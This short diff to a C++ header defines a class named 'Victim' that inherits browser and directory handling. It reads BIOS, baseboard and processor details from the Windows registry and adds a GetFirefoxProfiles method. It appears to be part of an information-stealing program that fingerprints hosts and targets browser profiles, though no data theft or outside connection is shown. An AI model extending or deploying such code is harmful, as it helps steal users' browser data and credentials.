@@ -5,7 +5,6 @@
 #pragma once
 
 class Victim : public Browsers, public Directories{
-private:
 	//SYSTEM
 	std::string systemManu = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemManufacturer");
 	std::string systemProductName = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName");
@@ -21,4 +20,6 @@ private:
 	std::string BaseBoardManufacturer = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardManufacturer");
 	std::string BaseBoardProduct = Registers::KeyGetValue("HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardProduct");
 	Registers::Key CentralProcessorSubKeys = Registers::RegEnumSubKeys(HKEY_LOCAL_MACHINE, "Hardware\\Description\\System\\CentralProcessor");
+public:
+	bool GetFirefoxProfiles();
 };
